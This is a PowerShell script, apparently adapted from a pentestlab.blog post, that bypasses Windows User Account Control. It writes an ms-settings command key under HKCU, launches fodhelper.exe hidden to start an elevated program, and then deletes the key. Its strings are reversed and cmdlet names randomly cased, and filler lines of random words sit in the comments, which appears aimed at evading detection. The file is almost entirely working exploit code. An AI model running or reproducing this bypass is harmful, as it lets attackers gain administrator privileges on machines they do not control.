<#
.SYNOPSIS  
    This script can bypass User Access Control (UAC) via fodhelper.exe
　
    It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform UAC bypass and starts 
    an elevated command prompt. 
    　
.NOTES  
    Function   : FodhelperUACBypass
    File Name  : FodhelperUACBypass.ps1 
    Author     : netbiosX. - pentestlab.blog 
　
# syringocoele spotlessness coeliorrhoea electrologist jocasta drawout repunish overflogged suberinize soochongs psilomelane tortillions foremost repurchasing 
.LINKS          
    https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692
    https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/    
　
.EXAMPLE  
　
     Load "cmd /c start C:\Windows\System32\cmd.exe" (it's default):
     FodhelperUACBypass 
# arborescent intercircled ultraritualism endoscopies embarrassing telinga cacosmia agiotages rubrics apostille tracheochromatic postexistence 
　
     Load specific application:
     FodhelperUACBypass -program "cmd.exe"
     FodhelperUACBypass -program "cmd.exe /c powershell.exe"　
#>

function FodhelperUACBypass(){ 
 Param (
           
        [STrIng]$SorryheartedSherifi = (-join "exe.dmc\23metsyS\swodniW\:C trats c/ dmc"[-1..-40]) #default
       )
　
    #Create Registry Structure
    NeW-iteM (-join "dnammoc\nepO\llehS\sgnittes-sm\sessalC\erawtfoS\:UCKH"[-1..-53]) -Force
    nEw-iTeMPRoPERty -Path (-join "dnammoc\nepO\llehS\sgnittes-sm\sessalC\erawtfoS\:UCKH"[-1..-53]) -Name (-join "etucexEetageleD"[-1..-15]) -Value "" -Force
    sET-ItEMprOpERtY -Path (-join "dnammoc\nepO\llehS\sgnittes-sm\sessalC\erawtfoS\:UCKH"[-1..-53]) -Name (-join ")tluafed("[-1..-9]) -Value $SorryheartedSherifi -Force
　
    #Start fodhelper.exe
    StArT-pROCESS (-join "exe.replehdof\23metsyS\swodniW\:C"[-1..-33]) -WindowStyle Hidden
　
    #Cleanup
    sTARt-SlEEP 3
    reMOve-itEM (-join "\sgnittes-sm\sessalC\erawtfoS\:UCKH"[-1..-35]) -Recurse -Force
　
}
